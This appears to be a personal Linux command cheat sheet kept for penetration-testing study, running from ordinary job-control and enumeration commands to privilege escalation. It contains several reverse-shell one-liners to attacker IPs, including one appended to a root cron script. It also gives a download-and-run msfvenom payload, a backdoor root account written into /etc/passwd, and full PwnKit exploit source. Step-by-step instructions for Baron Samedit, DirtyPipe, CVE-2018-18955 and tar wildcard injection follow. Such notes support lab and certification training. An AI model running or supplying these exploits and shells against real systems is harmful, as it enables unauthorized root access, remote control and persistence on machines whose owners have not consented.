> A Unix shell and command language.
> 
> Commands here are commonly available on many Linux distributions. 
> Specialized or uncommon binaries will be in a separate note of its own.

# Job Control

#Job_Control

List the current jobs
```bash
jobs
```

Resume the job next in the queue
```bash
fg
```

Resume job
```bash
fg %[number]
```

Push the next job in the queue into the background
```bash
bg
```

Push job into the background
```bash
bg %[number]
```

Force stop the job
```bash
kill %[number]
```

# File Searching

#File_Searching 

Update the locate database and search for a file
```bash
sudo updatedb
locate findme.txt
```

Find file of specific name from root directory
```bash
find / -name flag
```

Find file of specific size from root directory
```bash
find / -type f -size 64c -print
```

Find files not owned by the user "root" less than 1 day ago in current directory
```bash
find . -mtime -1 ! -user root
```
- `.` 
	- Search current directory
- `-mtime -1` 
	- Filter files based on their modification time. `-1` specifies "less than 1 day ago" or "within the last 24 hours."
- `! -user root`: 
	- `!` symbol is a logical operator that negates the following condition. 
	- `-user root` specifies the condition to find files that are not owned by the user "root".

Search for a manual using keywords
```bash
man -k '^passwd$' 
```

Search the list of `man` page descriptions for a possible match based on a keyword
```bash
apropos partition
```

# File Sharing

#File_Sharing 

Transferring the source code to the target machine with secure copy
```bash
scp cve-2017-16995.c hentaisalesman@192.168.123.123:
```

Transferring files to target machine with `scp`
```bash
scp authorized_keys kali@192.168.50.200:/home/kali/Downloads/
```

Downloading binary with `wget`
```bash
wget http://192.168.50.200:8000/linpeas.sh
```

## File Compression

Creating tarball
```bash
tar -zcvf CVE-2021-3156.tar.gz CVE-2021-3156-main
```

Extracting tarball
```bash
tar -xvf archive.tar.gz
```

# Shell Access

#Shell_Access #Remote_Access

Bash reverse shell one-liner
```bash
bash -i >& /dev/tcp/192.168.120.101/4444 0>&1
```

Bash reverse shell one-liner executed as command in Bash
```bash
bash -c "bash -i >& /dev/tcp/192.168.69.101/4444 0>&1"
```

URL encoded Bash TCP reverse shell one-liner
```bash
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.50.101%2F4444%200%3E%261%22
```

Adding a Reverse Shell One-Liner to a Cron Scheduled Script E.g., `hentai_video_backups.sh`
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.69.70 1234 >/tmp/f" >> hentai_video_backups.sh
```

Download `msfvenom` reverse shell payload and execute
```bash
wget http://192.168.50.102:80/shell-x64.elf && chmod +x shell-x64.elf && ./shell-x64.elf
```

# Upgrading Shell

#Full_Interactive_Shell 

Upgrade shell session within the current shell
```bash
script -qc /bin/bash /dev/null
```

# Enumeration and Privilege Escalation

#Linux_Enumeration #Linux_Privilege_Escalation

## Current User

Inspecting current user's `sudo` permissions
```bash
sudo -l
```

Inspecting file permissions and users ownership
```bash
ls -l /etc/passwd
```

Getting information about the current user
```bash
id
```

## Machine Users

Getting information about the users
```bash
cat /etc/passwd
```

## Machine Information

Getting information about the hostname
```bash
hostname
```

View the name and version of the running Linux operation system distribution 
```bash
cat /etc/issue
```

View variables that describe the running Linux operating system
```bash
uname -a
```
```bash
cat /etc/os-release
```
```bash
cat /proc/version
```
```bash
lsb_release -a
```
```bash
cat /etc/debian_version
```
```bash
cat /etc/redhat-release
```

Getting Linux kernel version
```bash
uname -r
```

Getting Linux architecture information
```bash
arch
```

## Network Information

Listing the full TCP/IP configuration on all available adapters on Linux
```bash
ip a
```

Listing network interfaces on Linux
```bash
ip addr
```

Printing the routes on Linux
```bash
ip route
```
```bash
route
```
```bash
routel
```

Listing all active network connections on Linux
```bash
ss -anp
```
```bash
netstat -anp
```

List only TCP connections, UDP connections and listening ports
```bash
ss -ntplu
```
```bash
netstat -ntplu
```

Inspecting custom IP tables
```bash
cat /etc/iptables/rules.v4
```

Checking the configured DNS server
```bash
resolvectl status
```

## Scheduled Tasks

Listing all cron jobs
```bash
ls -lah /etc/cron*
```

Listing cron jobs for the current user
```bash
crontab -l
```

Listing cron jobs for the root user
```bash
sudo crontab -l
```

Inspecting the cron log file
```bash
grep "CRON" /var/log/syslog
```

## Searching/Listing Files or Directories

Recursively list filetypes 
```
find . -type f -exec file -- {} +
```

Listing all world writable directories
```bash
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
```

Listing all world writable files
```bash
find / -writable -type f 2>/dev/null
```

Listing all world executable directories
```bash
find / -perm -o x -type d 2>/dev/null
```

## Installed packages

Listing all installed packages on a Debian Linux operating system
```bash
dpkg -l
```
```bash
rpm -qa
```
```bash
ls -lah /usr/bin/
```
```bash
ls -lah /sbin/
```

## Drives

Listing content of `/etc/fstab` and all mounted drives
```bash
cat /etc/fstab
mount
```

Listing all available drives using `lsblk`
```bash
lsblk
```

## Drivers

Listing loaded drivers
```bash
lsmod
```

Displaying additional information about a module E.g., `libata`
```bash
/sbin/modinfo libata
```

## Monitoring output

Refresh output of a command for monitoring E.g., `ps`
```bash
watch -n 1 "ps -aux | grep pass"
```

## Files

Inspecting the `syslog` file E.g., For '`tcpdump`' related events
```bash
cat /var/log/syslog | grep tcpdump
```
-  Investigate errors during privilege escalation

## AppArmor

Verifying AppArmor status
```bash
su - root
aa-status
```

## Processes

Inspecting process credentials E.g., `passwd`
```bash
ps u -C passwd
```

Getting a list of running processes on Linux
```bash
ps aux
```

Getting a list of processes running as root on Linux
```bash
ps auxf | grep -i 'root' --color=auto
```

## UID

Inspect the real UID and effective UID assigned for the process by inspecting the proc pseudo-filesystem
```bash
grep Uid /proc/1932/status
```
```bash
cat /proc/1131/status | grep Uid
```

## SUID

Revealing the SUID flag in the binary application E.g., `passwd`
```bash
ls -asl /usr/bin/passwd
```

Searching for SUID files
```bash
find / -perm -u=s -type f 2>/dev/null
```
```bash
find / -perm -4000 2>/dev/null
```
- `setuid` and `setgid` allows the current user to execute the file with the rights of the _owner_ (setuid) or the _owner's group_ (setgid).
- If these two rights are set, either an uppercase or lowercase "s" will appear in the permissions. 
- When a user or a system-automated script launches a SUID application, it inherits the UID/GID of its initiating script, known as effective UID/GID (eUID, eGID)

## GUID

Searching for GUID files
```bash
find / -perm -g=s -type f 2>/dev/null
```

## Capabilities

Enumerating Linux Capabilities
```bash
/usr/sbin/getcap -r / 2>/dev/null
```
- Use [[gtfobins.github.io]] for suggestions
- Linux Capabilities are extra attributes that can be applied to processes, binaries, and services to assign specific privileges normally reserved for administrative operations, such as traffic capturing or adding kernel modules. 

## Root Shell

Obtaining Root Shell Access
```bash
sudo su
```
- Non-login shell
- sets HOME to /root
- Prunes the environment

```bash
sudo -i
```
- Login shell
- sets HOME to /root
- Prunes the environment

```bash
sudo su -l
```
- Login shell
- sets HOME to /root
- Prunes the environment
- When invoking a shell, this is equivalent to sudo -i

```bash
sudo -s
```
- Non-login shell
- sets HOME to /root
- Prunes the environment
- When invoking a shell, this is equivalent to sudo su

```bash
sudo -Es
```
- Non-login shell
- Leaves HOME alone
- Leaves the environment alone (except for $PATH and $LD_LIBRARY_PATH iirc)

```bash
su -
```
- Login shell
- sets HOME to the target user's home directory
- Executes the target user's login scripts
- Switches to the target user with a fresh environment

```bash
su
```
- Non-login shell
- sets HOME to the current user's home directory
- Maintains the current environment
- Switches to the target user while keeping the environment intact

Switch to specified user with a complete login session
```bash
su - <user>
```
- Non-login shell
- sets HOME to user
- Uses that user’s environment variables

Switch to the specified user while keeping your current environment intact.
```bash
su <user>
```
- Non-login shell
- maintains your current environment including:
	- working directory
	- environment variables
- Does not execute the user's login scripts

Escalating privileges by editing /etc/passwd
```bash
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```
- Linux passwords are generally stored in `/etc/shadow`
	- which is not readable by normal users. 
- Historically however, password hashes, along with other account information, were stored in the world-readable file `/etc/passwd`. 
	- For backwards compatibility, if a password hash is present in the second column of an `/etc/passwd` user record, it is considered valid for authentication and it takes precedence over the respective entry in `/etc/shadow`, if available. 
	- This means that if we can write into `/etc/passwd`, we can effectively set an arbitrary password for any account.

Getting a root shell by abusing SUID program (find)
```bash
find /home/hentaisalesman/Desktop -exec "/usr/bin/bash" -p \;
```

# Potential Exploits

## Polkit pkexec (PwnKit CVE-2021-4034)
https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
https://ine.com/blog/exploiting-pwnkit-cve-20214034

- [ ] Create file `evil-so.c`
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0);
    execve("/bin/sh", NULL, NULL);
}
```

- [ ] Create file `exploit.c`
```c
#include <stdio.h>
#include <stdlib.h>

#define BIN "/usr/bin/pkexec"
#define DIR "evildir"
#define EVILSO "evil"

int main()
{
    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        "SHELL=ryaagard",
        "CHARSET=ryaagard",
        NULL
    };
    char *argv[] = { NULL };
    
    system("mkdir GCONV_PATH=.");
    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
    system("mkdir " DIR);
    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
    system("cp " EVILSO ".so " DIR);
    
    execve(BIN, argv, envp);
    
    return 0;
}
```

- [ ] Compile the binaries
```bash
gcc -shared -o evil.so -fPIC evil-so.c
gcc exploit.c -o exploit
```

- [ ] Run exploit
```bash
./exploit
```

Alternatively, you may exploit this vulnerability using a different GitHub Repository.
https://github.com/arthepsy/CVE-2021-4034

- [ ] Create file `cve-2021-4034-poc.c`
```c
/*
 * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis <moo@arthepsy.eu>
 * Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell = 
	"#include <stdio.h>\n"
	"#include <stdlib.h>\n"
	"#include <unistd.h>\n\n"
	"void gconv() {}\n"
	"void gconv_init() {\n"
	"	setuid(0); setgid(0);\n"
	"	seteuid(0); setegid(0);\n"
	"	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
	"	exit(0);\n"
	"}";

int main(int argc, char *argv[]) {
	FILE *fp;
	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
	fp = fopen("pwnkit/pwnkit.c", "w");
	fprintf(fp, "%s", shell);
	fclose(fp);
	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
```

- [ ] Compile binary
```bash
gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
```

- [ ] Execute PoC exploit
```bash
./cve-2021-4034-poc
```


## Sudo heap based buffer overflow (Baron Samedit CVE-2021-3156)
https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt

- [ ] Download file
```
wget https://codeload.github.com/blasty/CVE-2021-3156/zip/main
```
- Untested: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

- [ ] Compile binary
```
unzip main
cd CVE-2021-3156-main
make
chmod 777 sudo-hax-me-a-sandwich
./sudo-hax-me-a-sandwich
```

- [ ] Run exploit
```
./sudo-hax-me-a-sandwich 0
./sudo-hax-me-a-sandwich 1
./sudo-hax-me-a-sandwich 2
```

## DirtyPipe (CVE-2022-0847)

- [ ] Download dirtyPipe vulnerability checker and serve
```
wget https://raw.githubusercontent.com/basharkey/CVE-2022-0847-dirty-pipe-checker/main/dpipe.sh
python3 -m http.server 80
```

- [ ] Download on target
```
wget 192.168.45.169/dpipe.sh
```

- [ ] Run vulnerability checker 
```
chmod +x dpipe.sh 
./dpipe.sh
```

- [ ] Clone repo for dirtypipe and serve
```
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
python3 -m http.server 80
```

- [ ] Download on target
```
wget 192.168.45.169/compile.sh
wget 192.168.45.169/exploit-1.c
wget 192.168.45.169/exploit-2.c
```

- [ ] Compile
```
chmod +x compile.sh
./compile.sh
```

- [ ] Run exploit 1
```
./exploit-1
```

- [ ] Run exploit 2
```
./exploit-2 /usr/bin/sudo
```

## subuid_shell (CVE-2018-18955)

- [ ] Download binaries and serve
```
https://github.com/scheatkode/CVE-2018-18955/releases/tag/v0.0.1
python3 -m http.server 80
```
- I used [linux-x86_64.tar.gz](https://github.com/scheatkode/CVE-2018-18955/releases/download/v0.0.1/linux-x86_64.tar.gz)

- [ ] Transfer to Target Machine
```
wget 192.168.45.200/linux-x86_64.tar.gz
tar -xvf linux-x86_64.tar.gz
cd linux-x86_64/bin
```

- [ ] Use exploit
```
chmod 777 subuid_shell
./subuid_shell
```

## Unix Wildcard Injection
> Can be used if cronjob or binary is run by root

### Tar Wildcard Injection

- [ ] Check for tar wildcard cron job run as root on the Target Machine
```
ls -lah /etc/cron*
```

Examples:
```
sudo tar -cf example.tar *
tar cf archive.tar *
tar -zxf /tmp/backup.tar.gz *
```

- [ ] Generate nc reverse shell payload using msfvenom on your Kali Machine
```
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.45.169 lport=8888 R
```

 - [ ] Navigate to the directory that the cronjob will run tar with a wildcard and create the 3 exploit files on the Target Machine
```
echo "mkfifo /tmp/fgbepo; nc 192.168.45.169 8888 0</tmp/fgbepo | /bin/sh >/tmp/fgbepo 2>&1; rm /tmp/fgbepo" > shell.sh
echo "" > --checkpoint=1 
echo "" > "--checkpoint-action=exec=sh shell.sh" 
```
- Running `tar cf archive.tar *` now will be giving a reverse shell as the current user

References
https://www.exploit-db.com/papers/33930
https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c